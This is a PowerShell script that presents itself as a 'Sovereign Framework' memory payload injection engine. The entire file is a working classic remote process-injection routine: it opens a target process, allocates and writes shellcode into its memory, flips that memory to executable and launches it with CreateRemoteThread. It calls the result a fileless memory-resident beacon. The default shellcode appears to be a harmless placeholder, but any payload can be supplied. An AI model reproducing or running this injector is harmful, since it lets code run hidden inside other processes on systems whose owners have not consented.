# =======================================================================================
# Sovereign Framework - Production Memory Payload Injection Control Engine
# File: C:\RawrXD\SovereignRecovery\SovereignPayloadInjector.ps1
# Layers: Layer 5 (Security & Context Manipulation)
# =======================================================================================

[CmdletBinding()]
param ()

$Win32MemoryPrimitives = @'
using System;
using System.Runtime.InteropServices;

public class SovereignMem {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
'@
Add-Type -TypeDefinition $Win32MemoryPrimitives -ErrorAction SilentlyContinue

function Invoke-SovereignMemoryResidentBeacon {
    param (
        [int]$TargetProcessId,
        [byte[]]$ShellcodePayload = @(
            0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x90, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0xD0, 0xFE, 
            0xFF, 0xFF, 0xB8, 0x4E, 0x4F, 0x44, 0x45, 0x89, 0x01, 0xB8, 0x48, 0x45, 0x52, 0x45, 0x89, 0x41, 
            0x04, 0xB8, 0x49, 0x43, 0x5F, 0x5A, 0x89, 0x41, 0x08, 0xB8, 0x45, 0x52, 0x4F, 0x5F, 0x89, 0x41, 
            0x0C, 0xB8, 0x4F, 0x43, 0x4B, 0x53, 0x89, 0x41, 0x10, 0x48, 0x81, 0xC4, 0x90, 0x01, 0x00, 0x00, 
            0x5D, 0xC3
        )
    )

    Write-Output "[INJECTOR] Target migration vector initialized against process ID: $TargetProcessId"

    # PROCESS_CREATE_THREAD (0x0002) | PROCESS_VM_OPERATION (0x0008) | PROCESS_VM_WRITE (0x0020) | PROCESS_VM_READ (0x0010)
    $TargetAccessMask = 0x0002 -bor 0x0008 -bor 0x0020 -bor 0x0010
    $ProcessHandle = [SovereignMem]::OpenProcess($TargetAccessMask, $false, $TargetProcessId)
    
    if ($ProcessHandle -eq [IntPtr]::Zero) {
        Write-Warning "[INJECTOR] Access signature verification faulted. Unable to establish kernel hook bounds."
        return $false
    }

    try {
        # 1. Allocate virtual space inside target boundary process (MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000)
        $AllocationSize = [uint32]$ShellcodePayload.Length
        $TargetAddressPointer = [SovereignMem]::VirtualAllocEx($ProcessHandle, [IntPtr]::Zero, $AllocationSize, 0x3000, 0x04)
        
        if ($TargetAddressPointer -eq [IntPtr]::Zero) {
            throw "Virtual address context tracking rejected memory window assignment."
        }

        # 2. Synchronize payload bytes down into allocated virtual memory frame
        $BytesWrittenCount = [IntPtr]::Zero
        $WriteStatus = [SovereignMem]::WriteProcessMemory($ProcessHandle, $TargetAddressPointer, $ShellcodePayload, $ShellcodePayload.Length, [ref]$BytesWrittenCount)
        
        if (-not $WriteStatus -or ($BytesWrittenCount.ToInt64() -ne $ShellcodePayload.Length)) {
            throw "WriteProcessMemory structural byte stream replication mismatched baseline footprint size."
        }

        # 3. Escalate memory permission mappings to execute securely (PAGE_EXECUTE_READ = 0x20)
        $OldPermissionsFlag = 0
        $ProtectStatus = [SovereignMem]::VirtualProtectEx($ProcessHandle, $TargetAddressPointer, [UIntPtr]$AllocationSize, 0x20, [ref]$OldPermissionsFlag)
        
        if (-not $ProtectStatus) {
            throw "VirtualProtectEx memory protection execution level conversion rejected."
        }

        # 4. Spool and execute remote execution loop sequence thread within the isolated shell frame
        $RemoteThreadIdentifier = 0
        $ThreadHandlePointer = [SovereignMem]::CreateRemoteThread($ProcessHandle, [IntPtr]::Zero, 0, $TargetAddressPointer, [IntPtr]::Zero, 0, [ref]$RemoteThreadIdentifier)
        
        if ($ThreadHandlePointer -ne [IntPtr]::Zero) {
            Write-Output "[SUCCESS] Fileless Memory-Resident Beacon verified active at: 0x$($TargetAddressPointer.ToString('X16')) (Thread: $RemoteThreadIdentifier)"
            [void][SovereignMem]::CloseHandle($ThreadHandlePointer)
            return $true
        } else {
            throw "CreateRemoteThread failed to trigger payload entry pointer."
        }
    }
    catch {
        Write-Error "[FATAL ERROR] Memory-Resident allocation routine collapsed: $_"
        return $false
    }
    finally {
        [void][SovereignMem]::CloseHandle($ProcessHandle)
    }
}
